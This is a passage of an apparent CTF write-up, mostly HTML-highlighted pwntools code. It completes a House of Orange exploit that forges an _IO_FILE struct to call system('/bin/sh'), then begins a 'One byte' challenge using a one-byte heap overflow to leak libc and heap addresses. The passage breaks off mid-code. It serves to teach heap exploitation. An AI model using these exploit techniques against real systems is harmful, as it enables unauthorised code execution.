</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc_small</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc_large</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1>#io.sendline(b&#39;2&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#io.recvuntil(b&#39;&gt; &#39;)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendthen</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>timeout</span> <span class=o>=</span> <span class=mf>0.1</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;heap @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#===============================================================================================</span>
</span></span><span class=line><span class=cl><span class=c1># Create unsortedbin list</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc_small</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#overwrite top chunk size field to initial new heap from kernel</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Y&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1000</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>+</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc_large</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#===============================================================================================</span>
</span></span><span class=line><span class=cl><span class=c1>#unsortedbin attack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># =-=-=- PREPARE A FAKE _IO_FILE STRUCT -=-=-=</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set up a fake _IO_FILE struct alongside an unsortedbin attack.</span>
</span></span><span class=line><span class=cl><span class=c1># This chunk is sorted into the 0x60 smallbin later, meaning a pointer to it will form</span>
</span></span><span class=line><span class=cl><span class=c1># the _chain member of the _IO_FILE struct overlapping the main arena.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#fp</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mh>0x61</span>
</span></span><span class=line><span class=cl><span class=c1># A chunk&#39;s fd is ignored during a partial unlink.</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=mh>0x0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set up the bk pointer of this free chunk to point near _IO_list_all.</span>
</span></span><span class=line><span class=cl><span class=c1># This way _IO_list_all is overwritten by a pointer to the unsortedbin during the unsortedbin attack.</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Ensure fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base.</span>
</span></span><span class=line><span class=cl><span class=n>write_base</span> <span class=o>=</span> <span class=mh>0x01</span>
</span></span><span class=line><span class=cl><span class=n>write_ptr</span> <span class=o>=</span> <span class=mh>0x02</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Ensure fp-&gt;_mode &lt;= 0.</span>
</span></span><span class=line><span class=cl><span class=n>mode</span> <span class=o>=</span> <span class=mh>0x0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># For convenience place the pointer to system() in the last qword of the _IO_FILE struct,</span>
</span></span><span class=line><span class=cl><span class=c1># which is part of the _unused2 area.</span>
</span></span><span class=line><span class=cl><span class=c1># Set up the vtable pointer so that the __overflow entry overlaps this pointer.</span>
</span></span><span class=line><span class=cl><span class=n>vtable_ptr</span> <span class=o>=</span> <span class=n>heap</span> <span class=o>+</span> <span class=mh>0xd8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>unsortedbin_attack</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;Y&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span>  <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bk</span><span class=p>)</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=n>write_base</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>write_ptr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>18</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p32</span><span class=p>(</span><span class=n>mode</span><span class=p>)</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>12</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>vtable_ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>unsortedbin_attack</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># =-=-=- TRIGGER UNSORTEDBIN ATTACK -=-=-=</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Request the second small chunk, this sorts the old top chunk into the 0x60 smallbin and in doing so triggers</span>
</span></span><span class=line><span class=cl><span class=c1># the unsortedbin attack against _IO_list_all.</span>
</span></span><span class=line><span class=cl><span class=c1># The &#34;chunk&#34; at _IO_list_all will fail a size sanity check, causing malloc to call abort(). This in turn will</span>
</span></span><span class=line><span class=cl><span class=c1># call _IO_flush_all_lockp().</span>
</span></span><span class=line><span class=cl><span class=c1># The main arena (sometimes) fails the _IO_OVERFLOW checks and fp-&gt;_chain is followed which points to the old</span>
</span></span><span class=line><span class=cl><span class=c1># top chunk. Now the fake _IO_FILE struct is processed and the _IO_OVERFLOW checks will pass, the fake</span>
</span></span><span class=line><span class=cl><span class=c1># vtable pointer is followed and the fake __overflow entry is called.</span>
</span></span><span class=line><span class=cl><span class=n>malloc_small</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=one-byte>One byte</h2><h3 id=overall-5>Overall</h3><p><img src=https://hackmd.io/_uploads/HkhlxJlHR.png loading=lazy alt=image></p><ul><li>Full armour</li></ul><p><img src=https://hackmd.io/_uploads/Skmv11gHR.png loading=lazy alt=image></p><ul><li>No leak libc, heap.</li></ul><p><img src=https://hackmd.io/_uploads/H1rYyygH0.png loading=lazy alt=image></p><ul><li>No double free.</li></ul><p><img src=https://hackmd.io/_uploads/BJLJl1xBC.png loading=lazy alt=image></p><ul><li>No UAF.</li></ul><h4 id=malloc>malloc</h4><p><img src=https://hackmd.io/_uploads/SJCNgkxrA.png loading=lazy alt=image></p><ul><li>As you see, it calls calloc instead of malloc with a size of 0x58 (0x60 for chunk).</li><li>Memory blocks allocated by the calloc function are always initialized to zero.</li></ul><h4 id=free>free</h4><h5 id=it-is-simple-that-the-program-call-free-to-free-the-chunk-at-index-from-user-input>It is simple that the program call free to free the chunk at index from user input.</h5><h4 id=edit>edit</h4><h5 id=it-takes-input-from-userindex-to-write-data-to-this-index-chunk>It takes input from user(index) to write data to this index chunk.</h5><p><img src=https://hackmd.io/_uploads/B1xOG1xrA.png loading=lazy alt=image></p><ul><li>Input with a size of 0x59.</li></ul><h4 id=read>read</h4><h5 id=it-is-simple-that-the-program-call-write-data-from-the-chunk-at-index-to-stdout>It is simple that the program call write data from the chunk at index to stdout.</h5><h4 id=quit>quit</h4><h5 id=leave-the-program>Leave the program.</h5><h3 id=bug-1>Bug</h3><h5 id=call-alloc-to-allocate-0x58-size-however-it-take-input-from-the-user-with-0x59-size-this-mean-that-i-can-overwrite-one-byte>Call alloc to allocate 0x58 size; however, it take input from the user with 0x59 size. This mean that I can overwrite one byte.</h5><h3 id=template>Template</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./one_byte&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.23/libc.so.6x&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+244
</span></span></span><span class=line><span class=cl><span class=s2>b *main+311
</span></span></span><span class=line><span class=cl><span class=s2>b *main+415
</span></span></span><span class=line><span class=cl><span class=s2>b *main+480
</span></span></span><span class=line><span class=cl><span class=s2>b *main+560
</span></span></span><span class=line><span class=cl><span class=s2>b *main+652
</span></span></span><span class=line><span class=cl><span class=s2>b *main+713
</span></span></span><span class=line><span class=cl><span class=s2>b *main+788
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>remote</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x58</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>output</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=approach-5>Approach</h3><h5 id=everything-will-be-better-if-i-have-the-address-of-libc-and-heap>Everything will be better if I have the address of libc and heap</h5><h4 id=leak-libc>Leak libc</h4><p><em><strong>target:</strong></em> unsortedbin + remainder.</p><h5 id=i-can-overwrite-one-byte-so-i-can-control-the-size-of-the-succeeding-chunk-thus-if-i-overwrite-the-size-of-the-chunk-with-the-larger-size-then-free-it-this-free-chunk-will-overlap-other-chunk-that-doesnt-free>I can overwrite one byte, so I can control the size of the succeeding chunk. Thus, if I overwrite the size of the chunk with the larger size, then free it, this free chunk will overlap other chunk that doesn&rsquo;t free.</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>chunk_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_B</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_C</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_D</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>,</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mh>0x58</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0xc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_B</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/r1vfDkgHA.png loading=lazy alt=image></p><ul><li>After overwrite</li></ul><p><img src=https://hackmd.io/_uploads/HyxIw1eHC.png loading=lazy alt=image></p><ul><li>After free</li></ul><p><em><strong>Now, I can write and read data in chunk_C, which is overlaped by free chunk, so I can leak data from this free chunk.</strong></em></p><p>Add some lines of code and see the result</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>chunk_B2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>unsortedbin_data</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>chunk_C</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>unsortedbin</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>unsortedbin_data</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;unsortedbin: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>unsortedbin</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/ByE4qJxr0.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/BkQPqklrA.png loading=lazy alt=image></p><h4 id=leak-heap>Leak heap</h4><p><strong>target:</strong> fastbin dup</p><p>Add some lines of code</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>chunk_C2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_C2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fastbin_data</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>chunk_C</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>fastbin_data</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;heap: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/r1iBnJeHR.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/SySiaJxrR.png loading=lazy alt=image></p><h4 id=the-house-of-orange>The house of orange</h4><p><em><strong>target:</strong></em> overwrite vtable of _IO_list_all to trigger overflow function in vtable for pop shell.
Because I can overwrite one byte(size of chunk), I can control heap to create fake file stream.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># house of oragne</span>
